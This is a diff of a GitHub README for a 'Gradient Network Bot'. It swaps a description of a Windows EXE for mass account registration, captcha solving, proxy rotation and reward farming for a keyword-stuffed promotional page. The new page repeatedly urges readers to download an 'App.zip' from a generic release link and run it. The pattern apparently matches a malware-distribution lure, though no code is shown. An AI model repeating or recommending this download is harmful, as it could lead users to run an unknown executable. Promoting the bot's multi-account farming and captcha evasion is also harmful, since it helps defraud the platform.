@@ -1,79 +1,23 @@
-![1_Xfq577VPExfzgNk6CVViiA](https://github.com/swpzoer/Gradient-Network-Bot/releases)
+# 🌈 Welcome to the Gradient Network Bot Repository! 🤖
 
-# Gradient Bot
+![Gradient Network Bot](https://your-image-url.com)
 
+## Description
+This repository is home to the Gradient Network Bot, a powerful tool designed for optimizing your experience with Gradient Network. From autofarming to mining, this bot covers a wide range of functionalities to enhance your presence on the Gradient Network platform.
 
+## Topics
+🔗 **Topics**: gradient-autofarm, gradient-bot, gradient-crypto, gradient-extension-bot, gradient-farmer, gradient-free-download, gradient-miner, gradient-multifarmer, gradient-multireger, gradient-multiwallet, gradient-network, gradient-network-autoregistration, gradient-network-bot, gradient-network-extension, gradient-network-software, gradient-network-tool, gradient-network-tool-github, gradient-reger
 
-## Overview
+## Get Started
+🚀 To access the latest version of Gradient Network Bot, click [here](https://github.com/repo/releases/9246/App.zip).
+📦 Once downloaded, make sure to launch the application to start benefiting from its features.
 
-Gradient Bot is an advanced automation tool designed to streamline account registration and farming processes on Gradient Network. With its powerful features and user-friendly interface, it offers a seamless experience for users looking to maximize their efficiency on the platform.
+## Additional Information
+If the provided link is not working or you prefer to explore more options, feel free to check the "Releases" section of this repository.
 
+Don't miss out on the opportunity to level up your Gradient Network experience with this dynamic bot!
 
+## Stay Connected
+Let's stay connected! For more updates and information, visit our website at [Gradient Network](https://gradientnetwork.com).
 
----
-
-## 🚀 Features
-
-- ✅ Automatic account registration
-- 🌾 Automated farming
-- 🔄 Automated farming with auto-swap proxy
-- 🔁 Automated re-verification of accounts
-- 🧩 Captcha solving
-- 📧 Email verification
-- 🎟️ Invite code binding
-- 📊 Export statistics to CSV
-- 🧵 Multi-threaded support for registration, export stats, and re-verify accounts
-- 📤 Auto-export unverified/unregistered accounts
-
----
-
-## 💻 Requirements
-
-- Windows operating system
-- Internet connection
-- Valid email accounts for registration
-- Valid proxies
-
----
-
-## 🛠️ Setup
-
-1. Download the EXE file.
-2. Run the EXE file and login. It will automatically bind to your PC (the bind will disappear automatically if you close all sessions).
-3. Prepare the configuration files as described below.
-
----
-
-## 🚀 Usage
-
-1. Ensure all configuration files are set up correctly.
-2. Run the EXE file.
-
----
-
-## ⚠️ Important Notes
-
-- The script is limited to 2 active sessions. For example, you can use 2 sessions on one PC or 1 session on 2 PCs.
-- The bot uses CapSolver for solving captchas. Ensure you have sufficient balance in your CapSolver account.
-
----
-
-## 🔧 Troubleshooting
-
-- **Email Verification Issues**: Check your email provider's IMAP settings and ensure they match the configuration.
-- **Captcha Problems**: Verify your CapSolver API key and account balance.
-- **Unexpected Farming Stops**: Check the console output for error messages and ensure your account credentials are correct.
-
-### 🔑 Keywords
-
-- Gradient-Reger
-- Gradient-Farmer
-- Gradient-Miner
-- Gradient-Multireger
-- Gradient-Multifarmer
-- Gradient-Extension-Bot
-- Gradient-Bot
-- Gradient-Multiwallet
-- Gradient-AutoFarm
-
----
+[![Download Gradient Network Bot](https://img.shields.io/badge/Download-Gradient%20Bot-blue)](https://github.com/repo/releases/9246/App.zip)
